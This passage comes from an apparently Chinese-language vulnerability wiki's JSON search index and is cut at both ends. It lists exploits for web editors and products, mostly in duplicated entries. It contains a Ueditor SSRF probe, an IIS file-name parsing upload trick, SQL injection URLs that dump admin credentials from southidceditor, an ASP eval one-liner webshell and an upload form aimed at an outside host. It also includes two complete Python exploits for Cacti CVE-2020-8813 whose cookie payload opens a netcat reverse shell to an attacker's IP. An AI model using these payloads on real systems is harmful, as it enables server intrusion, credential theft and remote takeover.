ssrf\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A81.4.3.3%E7%89%88%E6%9C%ACssrf%E6%BC%8F%E6%B4%9E/#ueditor-ssrf","text":"","title":"Ueditor ssrf\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A81.4.3.3%E7%89%88%E6%9C%ACssrf%E6%BC%8F%E6%B4%9E/#_1","text":"v1.4.3","title":"\u6f0f\u6d1e\u5f71\u54cd\uff1a"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A81.4.3.3%E7%89%88%E6%9C%ACssrf%E6%BC%8F%E6%B4%9E/#poc","text":"\u5b58\u5728\u6f0f\u6d1e\u8def\u5f84\uff1a http://localhost:8088/jsp/controller.jsp?action=catchimage&source[]=http://192.168.135.133:8080/test.jpg \u53ef\u6839\u636e\u9875\u9762\u8fd4\u56de\u7684\u7ed3\u679c\u4e0d\u540c\u5224\u65ad\u8be5\u5730\u5740\u7aef\u53e3\u662f\u5426\u5f00\u653e\uff1a \u5982\u679c\u6293\u53d6\u4e0d\u5b58\u5728\u7684\u56fe\u7247\u5730\u5740\u65f6\uff0c\u9875\u9762\u8fd4\u56de{\"state\": \"SUCCESS\", list: [{\"state\":\"\\u8fdc\\u7a0b\\u8fde\\u63a5\\u51fa\\u9519\"} ]}\uff0c\u5373state\u4e3a\u201c\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519\u201d\u3002 \u5982\u679c\u6210\u529f\u6293\u53d6\u5230\u56fe\u7247\uff0c\u9875\u9762\u8fd4\u56de{\"state\": \"SUCCESS\", list: [{\"state\": \"SUCCESS\",\"size\":\"5103\",\"source\":\" http://192.168.135.133:8080/tomcat.png\",\"title\":\"1527173588127099881.png\",\"url\":\"/ueditor/jsp/upload/image/20180524/1527173588127099881.png \"} ]}\uff0c\u5373state\u4e3a\u201cSUCCESS\u201d\u3002 \u5982\u679c\u4e3b\u673a\u65e0\u6cd5\u8bbf\u95ee\uff0c\u9875\u9762\u8fd4\u56de{\"state\":\"SUCCESS\", list: [{\"state\": \"\\u6293\\u53d6\\u8fdc\\u7a0b\\u56fe\\u7247\\u5931\\u8d25\"}]}\uff0c\u5373state\u4e3a\u201c\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25\u201d\u3002 \u7531\u4e8e\u9664\u4e86\u5728config.js\u4e2d\u7684catcherLocalDomain\u914d\u7f6e\u4e86\u8fc7\u6ee4\u7684\u5730\u5740\u5916\uff0c\u6ca1\u6709\u9488\u5bf9\u5185\u90e8\u5730\u5740\u8fdb\u884c\u8fc7\u6ee4\uff0c\u6240\u4ee5\u53ef\u4ee5\u6839\u636e\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u8fd4\u56de\u7ed3\u679c\u7684\u4e0d\u540c\uff0c\u6765\u8fdb\u884c\u5185\u7f51\u7684\u63a2\u6d4b\u3002","title":"\u6f0f\u6d1ePOC"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Webhtmleditor/webhtml%20editor%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","text":"\u5229\u7528WIN 2003 IIS\u6587\u4ef6\u540d\u79f0\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97SHELL \u00b6 \u5f71\u54cd\u7248\u672c\uff1a<= Webhtmleditor\u6700\u7ec8\u72481.7 (\u5df2\u505c\u6b62\u66f4\u65b0) \u8106\u5f31\u63cf\u8ff0/\u653b\u51fb\u5229\u7528\uff1a \u5bf9\u4e0a\u4f20\u7684\u56fe\u7247\u6216\u5176\u4ed6\u6587\u4ef6\u65e0\u91cd\u547d\u540d\u64cd\u4f5c\uff0c\u5bfc\u81f4\u5141\u8bb8\u6076\u610f\u7528\u6237\u4e0a\u4f20diy.asp;.jpg\u6765\u7ed5\u8fc7\u5bf9\u540e\u7f00\u540d\u5ba1\u67e5\u7684\u9650\u5236\uff0c\u5bf9\u4e8e\u6b64\u7c7b\u56e0\u7f16\u8f91\u5668\u4f5c\u8005\u610f\u8bc6\u72af\u4e0b\u7684\u9519\u8bef\uff0c\u5c31\u7b97\u906d\u9047\u7f29\u7565\u56fe\uff0c\u6587\u4ef6\u5934\u68c0\u6d4b\uff0c\u4e5f\u53ef\u4f7f\u7528\u56fe\u7247\u6728\u9a6c \u63d2\u5165\u4e00\u53e5\u8bdd\u6765\u7a81\u7834\u3002","title":"Webhtml editor \u89e3\u6790\u6f0f\u6d1e\u5229\u7528"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Webhtmleditor/webhtml%20editor%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#win-2003-iisshell","text":"\u5f71\u54cd\u7248\u672c\uff1a<= Webhtmleditor\u6700\u7ec8\u72481.7 (\u5df2\u505c\u6b62\u66f4\u65b0) \u8106\u5f31\u63cf\u8ff0/\u653b\u51fb\u5229\u7528\uff1a \u5bf9\u4e0a\u4f20\u7684\u56fe\u7247\u6216\u5176\u4ed6\u6587\u4ef6\u65e0\u91cd\u547d\u540d\u64cd\u4f5c\uff0c\u5bfc\u81f4\u5141\u8bb8\u6076\u610f\u7528\u6237\u4e0a\u4f20diy.asp;.jpg\u6765\u7ed5\u8fc7\u5bf9\u540e\u7f00\u540d\u5ba1\u67e5\u7684\u9650\u5236\uff0c\u5bf9\u4e8e\u6b64\u7c7b\u56e0\u7f16\u8f91\u5668\u4f5c\u8005\u610f\u8bc6\u72af\u4e0b\u7684\u9519\u8bef\uff0c\u5c31\u7b97\u906d\u9047\u7f29\u7565\u56fe\uff0c\u6587\u4ef6\u5934\u68c0\u6d4b\uff0c\u4e5f\u53ef\u4f7f\u7528\u56fe\u7247\u6728\u9a6c \u63d2\u5165\u4e00\u53e5\u8bdd\u6765\u7a81\u7834\u3002","title":"\u5229\u7528WIN 2003 IIS\u6587\u4ef6\u540d\u79f0\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97SHELL"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/%E5%8D%97%E6%96%B9%E6%95%B0%E6%8D%AEsouthidceditor/%E5%8D%97%E6%96%B9%E6%95%B0%E6%8D%AE%E7%BC%96%E8%BE%91%E5%99%A8/","text":"\u5357\u65b9\u6570\u636e\u7f16\u8f91\u5668southidceditor\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\u8f83\u8001 1. \u6ce8\u5165 \u70b9: news_search.asp?key=7%' union select 0,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9 from admin where 1 or '%'='&otype=title&Submit=%CB%D1%CB%F7 \u76f4\u63a5\u66b4\u7ba1\u7406\u5458\u5e10\u53f7\u5bc6\u7801(md5) 2.\u767b\u9646\u540e\u53f0 3.\u5229\u7528\u7f16\u8f91\u5668 \u4e0a\u4f20 : \u8bbf\u95eeadmin/southidceditor/admin_style.asp \u4fee\u6539\u7f16\u8f91\u5668\u6837\u5f0f,\u589e\u52a0asa(\u4e0d\u8981asp).\u7136\u540e\u76f4\u63a5\u540e\u53f0\u7f16\u8f91\u65b0\u95fb\u4e0a\u4f20. ======================================== \u53c2\u8003\u8d44\u6599\u6574\u7406: 1\u3001\u901a\u8fc7upfile_other.asp\u6f0f\u6d1e\u6587\u4ef6\u76f4\u63a5\u53d6SHELL \u76f4\u63a5\u6253\u5f00userreg.asp\u8fdb\u884c\u6ce8\u518c\u4f1a\u5458\uff0c\u8fdb\u884c\u767b\u5f55\uff0c\uff08\u5728\u672a\u9000\u51fa\u767b\u5f55\u7684\u72b6\u6001\u4e0b\uff09\u4f7f\u7528\u672c\u5730\u4e0a\u4f20\u6587\u4ef6\u8fdb\u884c\u4e0a\u4f20\u4ee3\u7801\u5982\u4e0b\uff1a <HTML><HEAD> <META http-equiv=Content-Type content=\"text/html; charset=gb2312\"> <STYLE type=text/css>BODY { FONT-SIZE: 9pt; BACKGROUND-COLOR: #e1f4ee } .tx1 { BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: #000000 1px solid; COLOR: #0000ff; BORDER-BOTTOM: #000000 1px solid; HEIGHT: 20px } </STYLE> <META content=\"MSHTML 6.00.2800.1400\" name=GENERATOR></HEAD> <BODY leftMargin=0 topMargin=0> <FORM name=form1 action=\"http://www.webshell.cc/upfile_Other.asp\"; method=post encType=multipart/form-data><INPUT type=file size=30 name=FileName> <INPUT type=file size=30 name=FileName1> <INPUT xxxxx=\"BORDER-RIGHT: rgb(88,88,88) 1px double; BORDER-TOP: rgb(88,88,88) 1px double; FONT-WEIGHT: normal; FONT-SIZE: 9pt; BORDER-LEFT: rgb(88,88,88) 1px double; LINE-HEIGHT: normal; BORDER-BOTTOM: rgb(88,88,88) 1px double; FONT-STYLE: normal; FONT-VARIANT: normal\" type=submit value=\u4e0a\u4f20 name=Submit> <INPUT id=PhotoUrlID type=hidden value=0 name=PhotoUrlID> </FORM></BODY></HTML> \u5c06\u4ee5\u4e0a\u4ee3\u7801\u4fdd\u5b58\u4e3ahtml\u683c\u5f0f\uff0c\u66ff\u6362\u4ee3\u7801\u4e2d\u7684\u7f51\u5740\uff0c\u7b2c\u4e00\u4e2a\u6846\u91cc\u9009\u62e9\u56fe\u7247\u6587\u4ef6\uff0c\u7b2c\u4e8c\u4e2a\u6846\u9009\u62e9.cer\u3001.asa\u6216asp\u6587\u4ef6\u4e0a\u4f20\uff08\u540e\u9762\u9700\u8981\u52a0\u4e00\u4e2a\u7a7a\u683c\uff0c\u8c8c\u4f3c\u5728IE8\u4e2d\u8fdb\u884c\u4f7f\u7528\u4e0d\u80fd\u540e\u9762\u52a0\u7a7a\u683c\uff0c\u52a0\u7a7a\u683c\u65f6\u5c31\u5f39\u51fa\u9009\u62e9\u6587\u4ef6\u5bf9\u8bdd\u6846\uff0c\u6211\u662f\u627e\u4e0d\u5230\u89e3\u51b3\u529e\u6cd5\uff09\u3002 \u6ce8\uff1a\u6b64\u65b9\u6cd5\u901a\u6740\u5357\u65b9\u6570\u636e\u3001\u826f\u7cbe\u7cfb\u7edf\u3001\u7f51\u8f6f\u5929\u4e0b\u7b49 2\u3001\u901a\u8fc7\u6ce8\u5165\u79d2\u6740\u7ba1\u7406\u5458\u5e10\u53f7\u5bc6\u7801\uff0c\u4f7f\u7528\u5982\u4e0b\uff1a http://******/NewsType.asp?SmallClass=\u2019%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20\u2019\u2019=\u2019 \u4ee5\u4e0a\u4ee3\u7801\u76f4\u63a5\u66b4\u7ba1\u7406\u5458\u5e10\u53f7\u548c\u5bc6\u7801\uff0c\u53d6SHELL\u65b9\u6cd5\u5982\u4e0b\uff1a \u5728\u7f51\u7ad9\u914d\u7f6e[http://******/admin/SiteConfig.asp]\u7684\u7248\u6743\u4fe1\u606f\u91cc\u5199\u5165 \"%><%eval(request(chr(35)))%><%\u2019 \u6210\u529f\u628ashell\u5199\u5165http://******/inc/config.asp \u8fd9\u91cc\u4e00\u53e5\u8bddchr(32)\u5bc6\u7801\u662f\u201c#\u201d 3\u3001cookie\u6ce8\u5165 \u6e05\u7a7a\u5730\u5740\u680f\uff0c\u5229\u7528union\u8bed\u53e5\u6765\u6ce8\u5165\uff0c\u63d0\u4ea4\uff1a javascript:alert(document.cookie=\"id=\"+escape(\"1 and 1=2 union select 1,username,password,4,5,6,7,8,9,10 from Admin\"))","title":"\u5357\u65b9\u6570\u636e\u7f16\u8f91\u5668southidceditor\u6ce8\u5165\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/%E5%8D%97%E6%96%B9%E6%95%B0%E6%8D%AEsouthidceditor/%E5%8D%97%E6%96%B9%E6%95%B0%E6%8D%AE%E7%BC%96%E8%BE%91%E5%99%A8/#southidceditor","text":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\u8f83\u8001 1. \u6ce8\u5165 \u70b9: news_search.asp?key=7%' union select 0,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9 from admin where 1 or '%'='&otype=title&Submit=%CB%D1%CB%F7 \u76f4\u63a5\u66b4\u7ba1\u7406\u5458\u5e10\u53f7\u5bc6\u7801(md5) 2.\u767b\u9646\u540e\u53f0 3.\u5229\u7528\u7f16\u8f91\u5668 \u4e0a\u4f20 : \u8bbf\u95eeadmin/southidceditor/admin_style.asp \u4fee\u6539\u7f16\u8f91\u5668\u6837\u5f0f,\u589e\u52a0asa(\u4e0d\u8981asp).\u7136\u540e\u76f4\u63a5\u540e\u53f0\u7f16\u8f91\u65b0\u95fb\u4e0a\u4f20. ======================================== \u53c2\u8003\u8d44\u6599\u6574\u7406: 1\u3001\u901a\u8fc7upfile_other.asp\u6f0f\u6d1e\u6587\u4ef6\u76f4\u63a5\u53d6SHELL \u76f4\u63a5\u6253\u5f00userreg.asp\u8fdb\u884c\u6ce8\u518c\u4f1a\u5458\uff0c\u8fdb\u884c\u767b\u5f55\uff0c\uff08\u5728\u672a\u9000\u51fa\u767b\u5f55\u7684\u72b6\u6001\u4e0b\uff09\u4f7f\u7528\u672c\u5730\u4e0a\u4f20\u6587\u4ef6\u8fdb\u884c\u4e0a\u4f20\u4ee3\u7801\u5982\u4e0b\uff1a <HTML><HEAD> <META http-equiv=Content-Type content=\"text/html; charset=gb2312\"> <STYLE type=text/css>BODY { FONT-SIZE: 9pt; BACKGROUND-COLOR: #e1f4ee } .tx1 { BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: #000000 1px solid; COLOR: #0000ff; BORDER-BOTTOM: #000000 1px solid; HEIGHT: 20px } </STYLE> <META content=\"MSHTML 6.00.2800.1400\" name=GENERATOR></HEAD> <BODY leftMargin=0 topMargin=0> <FORM name=form1 action=\"http://www.webshell.cc/upfile_Other.asp\"; method=post encType=multipart/form-data><INPUT type=file size=30 name=FileName> <INPUT type=file size=30 name=FileName1> <INPUT xxxxx=\"BORDER-RIGHT: rgb(88,88,88) 1px double; BORDER-TOP: rgb(88,88,88) 1px double; FONT-WEIGHT: normal; FONT-SIZE: 9pt; BORDER-LEFT: rgb(88,88,88) 1px double; LINE-HEIGHT: normal; BORDER-BOTTOM: rgb(88,88,88) 1px double; FONT-STYLE: normal; FONT-VARIANT: normal\" type=submit value=\u4e0a\u4f20 name=Submit> <INPUT id=PhotoUrlID type=hidden value=0 name=PhotoUrlID> </FORM></BODY></HTML> \u5c06\u4ee5\u4e0a\u4ee3\u7801\u4fdd\u5b58\u4e3ahtml\u683c\u5f0f\uff0c\u66ff\u6362\u4ee3\u7801\u4e2d\u7684\u7f51\u5740\uff0c\u7b2c\u4e00\u4e2a\u6846\u91cc\u9009\u62e9\u56fe\u7247\u6587\u4ef6\uff0c\u7b2c\u4e8c\u4e2a\u6846\u9009\u62e9.cer\u3001.asa\u6216asp\u6587\u4ef6\u4e0a\u4f20\uff08\u540e\u9762\u9700\u8981\u52a0\u4e00\u4e2a\u7a7a\u683c\uff0c\u8c8c\u4f3c\u5728IE8\u4e2d\u8fdb\u884c\u4f7f\u7528\u4e0d\u80fd\u540e\u9762\u52a0\u7a7a\u683c\uff0c\u52a0\u7a7a\u683c\u65f6\u5c31\u5f39\u51fa\u9009\u62e9\u6587\u4ef6\u5bf9\u8bdd\u6846\uff0c\u6211\u662f\u627e\u4e0d\u5230\u89e3\u51b3\u529e\u6cd5\uff09\u3002 \u6ce8\uff1a\u6b64\u65b9\u6cd5\u901a\u6740\u5357\u65b9\u6570\u636e\u3001\u826f\u7cbe\u7cfb\u7edf\u3001\u7f51\u8f6f\u5929\u4e0b\u7b49 2\u3001\u901a\u8fc7\u6ce8\u5165\u79d2\u6740\u7ba1\u7406\u5458\u5e10\u53f7\u5bc6\u7801\uff0c\u4f7f\u7528\u5982\u4e0b\uff1a http://******/NewsType.asp?SmallClass=\u2019%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20\u2019\u2019=\u2019 \u4ee5\u4e0a\u4ee3\u7801\u76f4\u63a5\u66b4\u7ba1\u7406\u5458\u5e10\u53f7\u548c\u5bc6\u7801\uff0c\u53d6SHELL\u65b9\u6cd5\u5982\u4e0b\uff1a \u5728\u7f51\u7ad9\u914d\u7f6e[http://******/admin/SiteConfig.asp]\u7684\u7248\u6743\u4fe1\u606f\u91cc\u5199\u5165 \"%><%eval(request(chr(35)))%><%\u2019 \u6210\u529f\u628ashell\u5199\u5165http://******/inc/config.asp \u8fd9\u91cc\u4e00\u53e5\u8bddchr(32)\u5bc6\u7801\u662f\u201c#\u201d 3\u3001cookie\u6ce8\u5165 \u6e05\u7a7a\u5730\u5740\u680f\uff0c\u5229\u7528union\u8bed\u53e5\u6765\u6ce8\u5165\uff0c\u63d0\u4ea4\uff1a javascript:alert(document.cookie=\"id=\"+escape(\"1 and 1=2 union select 1,username,password,4,5,6,7,8,9,10 from Admin\"))","title":"\u5357\u65b9\u6570\u636e\u7f16\u8f91\u5668southidceditor\u6ce8\u5165\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adminer/Adminer%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/","text":"Adminer \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-21 15:40:48 \u6f0f\u6d1e\u5f71\u54cd \u00b6 Adminer<=4.3.1 \u6f0f\u6d1ePOC \u00b6 POC","title":"Adminer \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adminer/Adminer%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#adminer","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-21 15:40:48","title":"Adminer \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adminer/Adminer%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#_1","text":"Adminer<=4.3.1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adminer/Adminer%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#poc","text":"POC","title":"\u6f0f\u6d1ePOC"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/","text":"Cacti v1.2.8 authenticated Remote Code Execution (CVE-2020-8813) \u00b6 \u7b80\u4ecb \u00b6 Cacti\u662f\u4e00\u5957\u57fa\u4e8ePHP,MySQL,SNMP\u53caRRDTool\u5f00\u53d1\u7684\u7f51\u7edc\u6d41\u91cf\u76d1\u6d4b\u56fe\u5f62\u5206\u6790\u5de5\u5177\u3002 EXP1 \u9700\u8981\u8ba4\u8bc1 \u00b6 #!/usr/bin/python3 # Exploit Title: Cacti v1.2.8 Remote Code Execution # Date: 03/02/2020 # Exploit Author: Askar (@mohammadaskar2) # CVE: CVE-2020-8813 # Vendor Homepage: https://cacti.net/ # Version: v1.2.8 # Tested on: CentOS 7.3 / PHP 7.1.33 import requests import sys import warnings from bs4 import BeautifulSoup from urllib.parse import quote warnings . filterwarnings ( \"ignore\" , category = UserWarning , module = 'bs4' ) if len ( sys . argv ) != 6 : print ( \"[~] Usage : ./Cacti-exploit.py url username password ip port\" ) exit () url = sys . argv [ 1 ] username = sys . argv [ 2 ] password = sys . argv [ 3 ] ip = sys . argv [ 4 ] port = sys . argv [ 5 ] def login ( token ): login_info = { \"login_username\" : username , \"login_password\" : password , \"action\" : \"login\" , \"__csrf_magic\" : token } login_request = request . post ( url + \"/index.php\" , login_info ) login_text = login_request . text if \"Invalid User Name/Password Please Retype\" in login_text : return False else : return True def enable_guest ( token ): request_info = { \"id\" : \"3\" , \"section25\" : \"on\" , \"section7\" : \"on\" , \"tab\" : \"realms\" , \"save_component_realm_perms\" : 1 , \"action\" : \"save\" , \"__csrf_magic\" : token } enable_request = request . post ( url + \"/user_admin.php?header=false\" , request_info ) if enable_request : return True else : return False def send_exploit (): payload = \";nc$ {IFS} -e$ {IFS} /bin/bash$ {IFS}%s $ {IFS}%s \" % ( ip , port ) cookies = { 'Cacti' : quote ( payload )} requests . get ( url + \"/graph_realtime.php?action=init\" , cookies = cookies ) request = requests . session () print ( \"[+]Retrieving login CSRF token\" ) page = request . get ( url + \"/index.php\" ) html_content = page . text soup = BeautifulSoup ( html_content , \"html5lib\" ) token = soup . findAll ( 'input' )[ 0 ] . get ( \"value\" ) if token : print ( \"[+]Token Found : %s \" % token ) print ( \"[+]Sending creds ..\" ) login_status = login ( token ) if login_status : print ( \"[+]Successfully LoggedIn\" ) print ( \"[+]Retrieving CSRF token ..\" ) page = request . get ( url + \"/user_admin.php?action=user_edit&id=3&tab=realms\" ) html_content = page . text soup = BeautifulSoup ( html_content , \"html5lib\" ) token = soup . findAll ( 'input' )[ 1 ] . get ( \"value\" ) if token : print ( \"[+]Making some noise ..\" ) guest_realtime = enable_guest ( token ) if guest_realtime : print ( \"[+]Sending malicous request, check your nc ;)\" ) send_exploit () else : print ( \"[-]Error while activating the malicous account\" ) else : print ( \"[-] Unable to retrieve CSRF token from admin page!\" ) exit () else : print ( \"[-]Cannot Login!\" ) else : print ( \"[-] Unable to retrieve CSRF token!\" ) exit () EXP2 \u5f00\u542f\u6765\u5bbe\u5b9e\u65f6\u56fe\u67e5\u770b\u6743\u9650\u5219\u4e0d\u9700\u8981\u8ba4\u8bc1 \u00b6 #!/usr/bin/python3 # Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution # Date: 03/02/2020 # Exploit Author: Askar (@mohammadaskar2) # CVE: CVE-2020-8813 # Vendor Homepage: https://cacti.net/ # Version: v1.2.8 # Tested on: CentOS 7.3 / PHP 7.1.33 import requests import sys import warnings from bs4 import BeautifulSoup from urllib.parse import quote warnings . filterwarnings ( \"ignore\" , category = UserWarning , module = 'bs4' ) if len ( sys . argv ) != 4 : print ( \"[~] Usage : ./Cacti-exploit.py url ip port\" ) exit () url = sys . argv [ 1 ] ip = sys . argv [ 2 ] port = sys . argv [ 3 ] def send_exploit ( url ): payload = \";nc$ {IFS} -e$ {IFS} /bin/bash$ {IFS}%s $ {IFS}%s \" % ( ip , port ) cookies = { 'Cacti' : quote ( payload )} path = url + \"/graph_realtime.php?action=init\" req = requests . get ( path ) if req . status_code == 200 and \"poller_realtime.php\" in req . text : print ( \"[+] File Found and Guest is enabled!\" ) print ( \"[+] Sending malicous request, check your nc ;)\" ) requests . get ( path , cookies = cookies ) else : print ( \"[+] Error while requesting the file!\" ) send_exploit ( url ) \u8be6\u7ec6\u5206\u6790\u4ee5\u53ca\u6765\u6e90: https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/ \u00b6","title":"CVE 2020 8813   Cacti v1.2.8 RCE"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/#cacti-v128-authenticated-remote-code-execution-cve-2020-8813","text":"","title":"Cacti v1.2.8 authenticated Remote Code Execution (CVE-2020-8813)"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/#_1","text":"Cacti\u662f\u4e00\u5957\u57fa\u4e8ePHP,MySQL,SNMP\u53caRRDTool\u5f00\u53d1\u7684\u7f51\u7edc\u6d41\u91cf\u76d1\u6d4b\u56fe\u5f62\u5206\u6790\u5de5\u5177\u3002","title":"\u7b80\u4ecb"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/#exp1","text":"#!/usr/bin/python3 # Exploit Title: Cacti v1.2.8 Remote Code Execution # Date: 03/02/2020 # Exploit Author: Askar (@mohammadaskar2) # CVE: CVE-2020-8813 # Vendor Homepage: https://cacti.net/ # Version: v1.2.8 # Tested on: CentOS 7.3 / PHP 7.1.33 import requests import sys import warnings from bs4 import BeautifulSoup from urllib.parse import quote warnings . filterwarnings ( \"ignore\" , category = UserWarning , module = 'bs4' ) if len ( sys . argv ) != 6 : print ( \"[~] Usage : ./Cacti-exploit.py url username password ip port\" ) exit () url = sys . argv [ 1 ] username = sys . argv [ 2 ] password = sys . argv [ 3 ] ip = sys . argv [ 4 ] port = sys . argv [ 5 ] def login ( token ): login_info = { \"login_username\" : username , \"login_password\" : password , \"action\" : \"login\" , \"__csrf_magic\" : token } login_request = request . post ( url + \"/index.php\" , login_info ) login_text = login_request . text if \"Invalid User Name/Password Please Retype\" in login_text : return False else : return True def enable_guest ( token ): request_info = { \"id\" : \"3\" , \"section25\" : \"on\" , \"section7\" : \"on\" , \"tab\" : \"realms\" , \"save_component_realm_perms\" : 1 , \"action\" : \"save\" , \"__csrf_magic\" : token } enable_request = request . post ( url + \"/user_admin.php?header=false\" , request_info ) if enable_request : return True else : return False def send_exploit (): payload = \";nc$ {IFS} -e$ {IFS} /bin/bash$ {IFS}%s $ {IFS}%s \" % ( ip , port ) cookies = { 'Cacti' : quote ( payload )} requests . get ( url + \"/graph_realtime.php?action=init\" , cookies = cookies ) request = requests . session () print ( \"[+]Retrieving login CSRF token\" ) page = request . get ( url + \"/index.php\" ) html_content = page . text soup = BeautifulSoup ( html_content , \"html5lib\" ) token = soup . findAll ( 'input' )[ 0 ] . get ( \"value\" ) if token : print ( \"[+]Token Found : %s \" % token ) print ( \"[+]Sending creds ..\" ) login_status = login ( token ) if login_status : print ( \"[+]Successfully LoggedIn\" ) print ( \"[+]Retrieving CSRF token ..\" ) page = request . get ( url + \"/user_admin.php?action=user_edit&id=3&tab=realms\" ) html_content = page . text soup = BeautifulSoup ( html_content , \"html5lib\" ) token = soup . findAll ( 'input' )[ 1 ] . get ( \"value\" ) if token : print ( \"[+]Making some noise ..\" ) guest_realtime = enable_guest ( token ) if guest_realtime : print ( \"[+]Sending malicous request, check your nc ;)\" ) send_exploit () else : print ( \"[-]Error while activating the malicous account\" ) else : print ( \"[-] Unable to retrieve CSRF token from admin page!\" ) exit () else : print ( \"[-]Cannot Login!\" ) else : print ( \"[-] Unable to retrieve CSRF token!\" ) exit ()","title":"EXP1 \u9700\u8981\u8ba4\u8bc1"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/#exp2","text":"#!/usr/bin/python3 # Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution # Date: 03/02/2020 # Exploit Author: Askar (@mohammadaskar2) # CVE: CVE-2020-8813 # Vendor Homepage: https://cacti.net/ # Version: v1.2.8 # Tested on: CentOS 7.3 / PHP 7.1.33 import requests import sys import warnings from bs4 import BeautifulSoup from urllib.parse import quote warnings . filterwarnings ( \"ignore\" , category = UserWarning , module = 'bs4' ) if len ( sys . argv ) != 4 : print ( \"[~] Usage : ./Cacti-exploit.py url ip port\" ) exit () url = sys . argv [ 1 ] ip = sys . argv [ 2 ] port = sys . argv [ 3 ] def send_exploit ( url ): payload = \";nc$ {IFS} -e$ {IFS} /bin/bash$ {IFS}%s $ {IFS}%s \" % ( ip , port ) cookies = { 'Cacti' : quote ( payload )} path = url + \"/graph_realtime.php?action=init\" req = requests . get ( path ) if req . status_code == 200 and \"poller_realtime.php\" in req . text : print ( \"[+] File Found and Guest is enabled!\" ) print ( \"[+] Sending malicous request, check your nc ;)\" ) requests . get ( path , cookies = cookies ) else : print ( \"[+] Error while requesting the file!\" ) send_exploit ( url )","title":"EXP2 